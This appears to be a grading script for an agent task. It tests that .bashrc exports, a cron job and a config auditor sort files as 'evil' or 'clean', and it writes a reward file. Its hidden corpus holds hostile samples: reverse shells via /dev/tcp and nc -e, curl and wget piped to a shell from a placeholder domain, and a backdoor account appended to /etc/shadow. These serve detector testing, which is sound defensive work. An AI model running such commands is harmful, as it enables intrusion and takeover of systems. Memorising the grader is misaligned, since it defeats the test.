#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import json
import os
import random
import re
import secrets
import subprocess
import tempfile
import pytest


def run_auditor(script_path, input_dir):
    output_path = os.path.join(tempfile.mkdtemp(prefix="auditor-output-"), "report.json")
    try:
        result = subprocess.run(
            ["python3", script_path, input_dir, output_path],
            capture_output=True,
            text=True,
            timeout=20,
        )
    except subprocess.TimeoutExpired:
        pytest.fail("Auditing script timed out")

    if result.returncode != 0:
        pytest.fail(
            f"Script execution failed on {input_dir}:\n"
            f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
        )

    try:
        with open(output_path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError) as exc:
        pytest.fail(f"Auditor did not create valid JSON output: {exc}")

    assert isinstance(data, dict), "Auditor output must be a JSON dictionary"
    return data


def test_bashrc_exports():
    """Verify the required timezone and locale are actually exported by .bashrc."""
    bashrc_path = "/home/user/.bashrc"
    assert os.path.isfile(bashrc_path), f"Missing required file: {bashrc_path}"

    with open(bashrc_path, "r", encoding="utf-8") as f:
        content = f.read()

    # Preserve the original textual assertions.
    tz_match = re.search(r'TZ\s*=\s*["\']?Europe/Berlin["\']?', content)
    lang_match = re.search(r'LANG\s*=\s*["\']?de_DE\.UTF-8["\']?', content)
    assert tz_match is not None, "TZ=Europe/Berlin not properly set in /home/user/.bashrc"
    assert lang_match is not None, "LANG=de_DE.UTF-8 not properly set in /home/user/.bashrc"

    # Start with an empty environment, source the file as an interactive bash rc,
    # and inspect the resulting exported environment. Plain, unexported shell
    # assignments will not appear here.
    result = subprocess.run(
        [
            "/usr/bin/env", "-i", "HOME=/home/user",
            "/bin/bash", "--noprofile", "--rcfile", bashrc_path,
            "-ic", "/usr/bin/env -0",
        ],
        capture_output=True,
        timeout=10,
    )
    assert result.returncode == 0, f"Failed to load .bashrc: {result.stderr.decode(errors='replace')}"

    exported = {}
    for item in result.stdout.split(b"\0"):
        if b"=" in item:
            key, value = item.split(b"=", 1)
            exported[key.decode(errors="replace")] = value.decode(errors="replace")

    assert exported.get("TZ") == "Europe/Berlin", "TZ must be exported as Europe/Berlin"
    assert exported.get("LANG") == "de_DE.UTF-8", "LANG must be exported as de_DE.UTF-8"


def test_crontab_setup():
    """Verify that the cron job is correctly scheduled for the user account."""
    try:
        output = subprocess.check_output(
            ["crontab", "-l", "-u", "user"], stderr=subprocess.STDOUT
        ).decode("utf-8")
    except subprocess.CalledProcessError:
        try:
            output = subprocess.check_output(
                ["sudo", "-u", "user", "crontab", "-l"], stderr=subprocess.STDOUT
            ).decode("utf-8")
        except (subprocess.CalledProcessError, FileNotFoundError):
            pytest.fail("Failed to read crontab for 'user'. Ensure the crontab exists.")

    expected_cmd = "python3 /home/user/config_auditor.py /opt/configs /home/user/audit_report.json"
    found = False
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if expected_cmd in line and line.startswith("*/15"):
            found = True
            break

    assert found, (
        f"Cron job not found or incorrect schedule. Expected command: '{expected_cmd}' "
        "running every 15 minutes ('*/15 * * * *')."
    )


def test_auditor_script_adversarial_corpus():
    """Preserve checks against both provided training corpora."""
    script_path = "/home/user/config_auditor.py"
    assert os.path.isfile(script_path), f"Auditing script not found at {script_path}"

    evil_dir = "/app/corpora/evil"
    clean_dir = "/app/corpora/clean"
    assert os.path.isdir(evil_dir), f"Evil corpus directory missing: {evil_dir}"
    assert os.path.isdir(clean_dir), f"Clean corpus directory missing: {clean_dir}"

    evil_files = os.listdir(evil_dir)
    clean_files = os.listdir(clean_dir)
    assert len(evil_files) > 0, "Evil corpus directory is empty"
    assert len(clean_files) > 0, "Clean corpus directory is empty"

    evil_results = run_auditor(script_path, evil_dir)
    clean_results = run_auditor(script_path, clean_dir)

    evil_bypassed = [f for f in evil_files if evil_results.get(f) != "evil"]
    clean_modified = [f for f in clean_files if clean_results.get(f) != "clean"]

    error_msgs = []
    if evil_bypassed:
        error_msgs.append(
            f"{len(evil_bypassed)} of {len(evil_files)} evil bypassed: "
            + ", ".join(evil_bypassed)
        )
    if clean_modified:
        error_msgs.append(
            f"{len(clean_modified)} of {len(clean_files)} clean modified "
            f"(flagged as evil or missing): {', '.join(clean_modified)}"
        )
    if error_msgs:
        pytest.fail(" | ".join(error_msgs))


def test_auditor_on_hidden_mixed_novel_corpus():
    """Exercise novel content under opaque names in one randomly named directory."""
    script_path = "/home/user/config_auditor.py"
    assert os.path.isfile(script_path), f"Auditing script not found at {script_path}"

    nonce = secrets.token_hex(6)
    octets = [str(secrets.randbelow(200) + 20) for _ in range(4)]
    host = ".".join(octets)
    port = str(secrets.randbelow(40000) + 2000)
    domain = f"node-{nonce}.example.invalid"

    cases = [
        ("evil", f"#!/bin/bash\nexec 7<>/dev/tcp/{host}/{port}\n/bin/bash <&7 >&7 2>&7\n", ".sh"),
        ("evil", f"[Service]\nType=oneshot\nExecStart=/bin/sh -c 'curl -fsSL https://{domain}/install | /bin/bash'\n", ".service"),
        ("evil", f"17 3 * * * root wget -qO- http://{domain}/payload | /bin/sh\n", ".cron"),
        ("evil", "#!/bin/sh\nprintf '%s\\n' 'intruder::20000:0:99999:7:::' >> /etc/shadow\n", ".sh"),
        ("evil", f"#!/bin/sh\n/usr/bin/nc -e /bin/sh {host} {port}\n", ".sh"),
        ("clean", "#!/bin/sh\nsystemctl reload nginx\n", ".sh"),
        ("clean", f"#!/bin/sh\ncurl -fsS https://{domain}/release.tar.gz -o /var/tmp/release.tar.gz\n", ".sh"),
        ("clean", f"#!/bin/sh\nwget -q https://{domain}/manual.txt -O /var/tmp/manual.txt\n", ".sh"),
        ("clean", "[Unit]\nDescription=Log cleanup\n[Service]\nType=oneshot\nExecStart=/usr/bin/find /var/log -name '*.old' -delete\n", ".service"),
        ("clean", "*/10 * * * * root /usr/bin/df -h >> /var/log/disk-usage.log\n", ".cron"),
    ]
    random.SystemRandom().shuffle(cases)

    expected = {}
    with tempfile.TemporaryDirectory(prefix="config-input-") as input_dir:
        for label, body, suffix in cases:
            filename = secrets.token_hex(10) + suffix
            expected[filename] = label
            with open(os.path.join(input_dir, filename), "w", encoding="utf-8") as f:
                f.write(body)

        actual = run_auditor(script_path, input_dir)

    assert set(actual.keys()) == set(expected.keys()), (
        "Output must contain exactly one basename entry for every input file"
    )
    wrong = {
        name: {"expected": expected[name], "actual": actual.get(name)}
        for name in expected
        if actual.get(name) != expected[name]
    }
    assert not wrong, f"Incorrect classifications on hidden mixed corpus: {wrong}"
    assert all(value in ("clean", "evil") for value in actual.values()), (
        "Every result must be exactly 'clean' or 'evil'"
    )
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
